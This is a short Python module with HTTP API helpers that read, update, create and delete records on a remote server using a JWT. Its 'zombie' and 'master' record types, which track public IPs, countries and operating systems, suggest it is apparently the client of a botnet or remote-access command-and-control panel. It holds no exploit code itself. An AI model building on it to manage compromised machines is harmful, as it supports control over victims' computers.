#!/usr/bin/env python
# -*- coding: utf-8 -*-
# r3nt0n

import json

from app import zession
from app.modules import http_client


def read_data(data_type, filters=None):
    if filters is None:
        filters = {}
    url = "http://{}/api/get_{}.php".format(zession.remote_host, data_type)
    data = {'jwt': zession.token.jwt}
    if 'by_username' in filters:
        data['username'] = filters['by_username']
    if 'by_datetime_bef' in filters:
        data['datetime_bef'] = filters['by_datetime_bef']
    if 'by_datetime_aft' in filters:
        data['datetime_aft'] = filters['by_datetime_aft']
    if 'by_os' in filters:
        data['os'] = filters['by_os']
    if 'not_in' in filters:
        data['not_in'] = filters['not_in']
    data = json.dumps(data)
    # print(data)
    return http_client.json_post(url, data=data)


def update_data(data_type, new_data):
    url = "http://{}/api/update_{}.php".format(zession.remote_host, data_type)
    data = {'jwt': zession.token.jwt}

    if data_type == 'user':
        if not ('username' in new_data and 'pswd' in new_data):
            return False
        data['username'] = new_data['username']
        data['pswd'] = new_data['pswd']

    data = json.dumps(data)
    return http_client.json_post(url, data=data)


def create_data(data_type, new_data):
    url = "http://{}/api/create_{}.php".format(zession.remote_host, data_type)
    data = {'jwt': zession.token.jwt}
    if data_type == 'zombie':
        if not ('username' in new_data and 'current_public_ip' in new_data and 'current_country' in new_data):
            return False
        data['username'] = new_data['username']
        data['current_public_ip'] = new_data['current_public_ip']
        data['current_country'] = new_data['current_country']
    data = json.dumps(data)
    return http_client.json_post(url, data=data)


def delete_data(data_type, data_id):
    url = "http://{}/api/delete_{}.php".format(zession.remote_host, data_type)
    data = {'jwt': zession.token.jwt}
    if not (data_id):
        return False
    if (data_type == 'user' or data_type == 'master' or data_type == 'zombie'):
        data['username'] = data_id
    data = json.dumps(data)
    return http_client.json_post(url, data=data)